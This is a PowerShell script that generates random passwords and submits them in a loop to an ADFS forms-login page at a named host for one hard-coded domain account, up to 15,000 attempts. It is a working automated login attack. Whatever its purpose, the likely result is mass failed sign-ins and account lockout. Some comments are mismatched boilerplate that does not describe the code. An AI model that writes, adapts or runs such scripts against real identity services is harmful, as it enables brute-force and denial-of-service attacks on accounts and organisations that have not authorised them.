Function GET-Temppassword() {

Param(

[int]$length=10,

[string[]]$sourcedata

)

 

For ($loop=1; $loop –le $length; $loop++) {

            $TempPassword+=($sourcedata | GET-RANDOM)

            }

return $TempPassword

}

$ascii=$NULL;For ($a=33;$a –le 126;$a++) {$ascii+=,[char][byte]$a} 
# Sends a sign-in request by running the Invoke-WebRequest cmdlet. The command specifies a value of "fb" for the SessionVariable parameter, and saves the results in the $r variable.
$website = "https://sts.insim.biz/adfs/ls/idpinitiatedsignon.aspx"
$r=Invoke-WebRequest $website -SessionVariable sts
[int]$x = 0
Do
{
    If ($r.Forms.ID -contains "idpForm" -and $r.BaseResponse.Method -eq "GET")
    {
        #you are not getting the login form directly and first need to choose a RP or just do a general signin first.
        $body = @{"SignInIdpSite"="SignInIdpSite";"SignInSubmit"="Sign+in";"SingleSignOut"="SingleSignOut"}
        $r=Invoke-WebRequest -Uri $website -WebSession $sts -Method POST -Body $body
    }
    # Use the session v ariable that you created in Example 1. Output displays values for Headers, Cookies, Credentials, etc. 
    ElseIf($r.Forms.id -contains "loginForm"-and $r.BaseResponse.Method -eq "POST") 
    {
        $password = GET-Temppassword –length 15 –sourcedata $ascii
        $idpForm = $r.forms|Where-Object {$_.id -EQ "loginForm"}
        $IDPBody = @{"UserName"="insim.biz\m98h050";"Password"=$password;"AuthMethod"="FormsAuthentication"}
        #$idpForm.Fields["userNameInput"]="INSIM.BIZ\M06A898"
        #$idpForm.Fields["passwordInput"]= $password
        $idpRes = Invoke-WebRequest -Uri $website -WebSession $sts -Method POST -Body $IDPBody
        $x++
        Write-Host "Number of attempts done"$x
        Start-Sleep -Seconds 2
    }
    Else
    {
        exit
    }
}while ($x -ne 15000)